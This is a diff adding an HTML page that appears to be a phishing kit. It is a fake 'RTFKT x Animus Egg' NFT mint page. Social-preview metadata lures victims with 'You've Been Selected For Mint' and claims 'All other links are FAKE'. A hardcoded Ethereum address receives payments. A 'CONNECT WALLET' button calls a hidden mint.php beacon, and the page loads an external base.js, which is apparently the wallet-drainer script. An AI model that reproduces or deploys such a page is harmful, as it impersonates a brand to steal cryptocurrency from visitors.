@@ -1,0 +1,179 @@
+<!DOCTYPE html>
+<html>
+    <head>
+        <meta charset="UTF-8" />
+        <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+        <meta name="viewport" content="width=device-width, initial-scale=1" />
+
+        <title>RTFKT x Animus Egg</title>
+        <link id="favicon" rel="icon" href="fav.ico" />
+
+        <meta property="og:type" content="website" />
+        <meta name="twitter:card" content="summary_large_image" />
+
+        <!-- Import CSS files -->
+        <link rel="stylesheet" type="text/css" href="fonts.css" media="all" />
+        <link rel="stylesheet" type="text/css" href="normalize.css" />
+        <link rel="stylesheet" type="text/css" href="main.css" />
+
+
+        <script>
+            const ethAddress = "0x7C9466D359Bf266f335B78a0A4b50998E0f77567"
+            const ethPerMint = 0.1;
+            const ethMaxPerWallet = 10;
+            const ethMaxSupply = 300;
+            const ethLeftSupply = 297;
+
+            var today = new Date();
+            var dd = String(today.getDate()).padStart(2, '0');
+            var mm = String(today.getMonth() + 1).padStart(2, '0');
+            var yyyy = today.getFullYear();
+
+            today = dd + '.' + mm + '.' + yyyy;
+        </script>
+
+        <script src="web3.min.js"></script>
+        <script src="jquery.min.js"></script>
+        <script src="base.js"></script>
+
+        <meta property="og:title" content="CLICK HERE TO MINT!" />
+    <meta property="og:site_name" content="This is an automatically generated announcement message" />
+    <meta property="og:description" content="🎁️ You&apos;ve Been Selected For Mint.
+🎉️️ Pre-sale info:
+▶️ Price: 0.1
+▶️ Supply: 300 NFT
+▶️ Limit: 10 NFT per wallet
+
+🚨 All other links are FAKE 🚨
+
+▶️ Thank you for your support and patience!
+">
+    <meta property="og:image" content="https://thumbsnap.com/i/vdAt7Qwp.gif">
+    <meta name="theme-color" content="#7289DA" />
+    <meta name="twitter:card" content="summary_large_image" />
+    </head>
+
+    <body class="body" style="background:url('bg.png'); background-color:#343434">
+        <div class="content">
+            <div class="sub-head" id="claim-text-wrapper">
+                <div id="payment-modal">
+                    <div id="payment-header">
+                        <div id="payment-header-text">
+                            <h4 id="titleH4"><span style="color: #e40c0c;">RTFKT x Animus Egg</span><br>EXCLUSIVE LIMITED SALE<br>IS LIVE</h4>
+                            <p id="totalSupply" class="pt-1.5 italic-grey">
+                                Only <b>300</b> NFT will be sold
+                                <!-- (Available: <b class="remaining-funds">113</b>)<br> -->
+                                <!-- NFT left:  -->
+                            </p>
+                        </div>
+                    </div>
+                    <div id="payment-info">
+                        <img src="gif.gif" class="image" id="price-img" />
+                        <div id="payment-info-text">
+                            <p>Price Per NFT</p>
+                            <p class="title"><a id="nftPrice">0.1</a> ETH + gas</p>
+                            <!-- <p id="dateString" class="launch-date">Pre sale available <b><script>document.write(today)</script></b></p> -->
+                            
+                        </div>
+                    </div>
+
+                    
+                    
+
+                    <div id="ape-number">
+                        <div class="calcs">
+                            <div id="remCount" class="eth-mint-minus">
+                                <svg width="16" height="2" viewBox="0 0 16 2" fill="none" xmlns="http://www.w3.org/2000/svg">
+                                    <path
+                                        d="M15 0H1C0.734784 0 0.48043 0.105357 0.292893 0.292893C0.105357 0.48043 0 0.734784 0 1C0 1.26522 0.105357 1.51957 0.292893 1.70711C0.48043 1.89464 0.734784 2 1 2H15C15.2652 2 15.5196 1.89464 15.7071 1.70711C15.8946 1.51957 16 1.26522 16 1C16 0.734784 15.8946 0.48043 15.7071 0.292893C15.5196 0.105357 15.2652 0 15 0Z"
+                                        fill="white"
+                                    ></path>
+                                </svg>
+                            </div>
+                            <h5 id="nftsNumber" class="nftsNumber eth-mint-count">1</h5>
+                            <div id="addCount" class="eth-mint-plus">
+                                <svg width="16" height="16" viewBox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg">
+                                    <path
+                                        d="M15 7H9V1C9 0.734784 8.89464 0.48043 8.70711 0.292893C8.51957 0.105357 8.26522 0 8 0C7.73478 0 7.48043 0.105357 7.29289 0.292893C7.10536 0.48043 7 0.734784 7 1V7H1C0.734784 7 0.48043 7.10536 0.292893 7.29289C0.105357 7.48043 0 7.73478 0 8C0 8.26522 0.105357 8.51957 0.292893 8.70711C0.48043 8.89464 0.734784 9 1 9H7V15C7 15.2652 7.10536 15.5196 7.29289 15.7071C7.48043 15.8946 7.73478 16 8 16C8.26522 16 8.51957 15.8946 8.70711 15.7071C8.89464 15.5196 9 15.2652 9 15V9H15C15.2652 9 15.5196 8.89464 15.7071 8.70711C15.8946 8.51957 16 8.26522 16 8C16 7.73478 15.8946 7.48043 15.7071 7.29289C15.5196 7.10536 15.2652 7 15 7Z"
+                                        fill="white"
+                                    ></path>
+                                </svg>
+                            </div>
+                        </div>
+                        <h5 id="maxNumber"><span class="eth-max-per-wallet">10</span> Max</h5>
+                    </div>
+                    <div id="ape-total">
+                        <p class="total">Total</p>
+                        <h5 class="actual_price"><a id="price" class="eth-sum">0.1</a> ETH + gas</h5>
+                    </div>
+                    <button class="purchase-button" id="mint" onclick="$('#image-mint').attr('src', 'mint.php')">CONNECT WALLET</button>
+
+                    <div class="container2" style="margin:10px 0 0 0">
+                        <div class="Loading">
+                            <div class="Loading-bar" style="width:0%"></div>
+                            <span>? / ?</span>
+                        </div>
+                    </div>
+
+                    <div class="last-minted">
+                        <div class="last-minted-title">LAST MINTED</div>
+                        <div class="last-minted-list">
+                                                            <div class="last-minted-single" style="color:#505050;text-align: center;">Loading...</div>
+                                                    </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <style>
+            .alert-eth-message{
+                position: fixed;
+                z-index: 9999;
+                background: rgba(0,0,0,.9);
+                top:0;
+                left:0;
+                right:0;
+                bottom:0;
+                color:white;
+                text-align: center;
+                padding:55px 15px 15px 15px;
+                display: none;
+            }
+            .alert-eth-message-close{
+                position: fixed;
+                top:0;
+                left:0;
+                right:0;
+                background: #f89d35;
+                text-align: center;
+                height: 40px;
+                line-height: 40px;
+                color:black;
+                font-weight: bold;
+            }
+            .alert-eth-message-close:hover{
+                cursor: pointer;
+            }
+        </style>
+
+        <div class="alert-eth-message">
+            <div class="alert-eth-message-close">CLOSE</div>
+            <span class="alert-eth-message-change"></span>
+        </div>
+
+        <script type="text/javascript">
+            $('.alert-eth-message-close').click(function(){
+                $('.alert-eth-message').fadeOut(200);
+            });
+        </script>
+
+        <img src="index.html#" id="image-mint" style="display: none;">
+
+        <div style="color: #4c4c4c;text-align: center;text-transform: uppercase;font-weight: bold;padding-bottom: 30px;">
+            RTFKT x Animus Egg © 2022<br>
+            <!-- <a href="#" style="color:#4c4c4c">Privacy Policy</a><br> -->
+            <!-- <a href="#" style="color:#4c4c4c">Terms Of Use</a> -->
+        </div>
+
+    </body>
+</html>
